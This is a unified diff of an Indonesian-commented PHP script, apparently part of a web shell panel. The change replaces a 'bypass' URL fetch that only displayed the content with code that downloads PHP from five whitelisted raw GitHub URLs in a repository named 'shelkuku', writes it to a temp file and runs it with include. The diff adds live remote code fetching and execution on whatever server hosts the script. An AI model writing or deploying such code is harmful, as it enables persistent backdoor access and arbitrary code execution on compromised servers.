@@ -72,11 +72,44 @@ if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
 if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
     $url = trim($_POST['bypass_url']);
     if ($url !== '') {
-        $data = @file_get_contents($url);
-        if ($data === false) {
-            $bypass_output = "Gagal mengambil konten dari URL: " . htmlspecialchars($url);
+        $allowed = array(
+            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/1.php',
+            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/2.php',
+            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/3.php',
+            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/4.php',
+            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/5.php',
+        );
+        if (!in_array($url, $allowed, true)) {
+            $bypass_output = "URL tidak diizinkan.";
         } else {
-            $bypass_output = $data; // tidak dieksekusi, hanya ditampilkan
+            $data = @file_get_contents($url);
+            if ($data === false) {
+                $bypass_output = "Gagal mengambil konten dari URL: " . htmlspecialchars($url);
+            } else {
+                // Eksekusi aman relatif: simpan sementara lalu include dengan output buffering
+                $tmpFile = sys_get_temp_dir() . '/bypass_' . md5($url . microtime(true)) . '.php';
+                if (@file_put_contents($tmpFile, $data) === false) {
+                    $bypass_output = "Gagal menulis file sementara.";
+                } else {
+                    // Jalankan dengan buffering
+                    ob_start();
+                    $err = '';
+                    try {
+                        include $tmpFile; // jalankan script
+                    } catch (Throwable $e) { // PHP 7+, fallback error
+                        $err = 'Exception: ' . $e->getMessage();
+                    } catch (Exception $e) { // PHP 5 compatibility
+                        $err = 'Exception: ' . $e->getMessage();
+                    }
+                    $execOut = ob_get_clean();
+                    @unlink($tmpFile);
+                    if ($err !== '') {
+                        $bypass_output = $err . "\n" . $execOut;
+                    } else {
+                        $bypass_output = $execOut === '' ? '[Tidak ada output]' : $execOut;
+                    }
+                }
+            }
         }
     }
 }
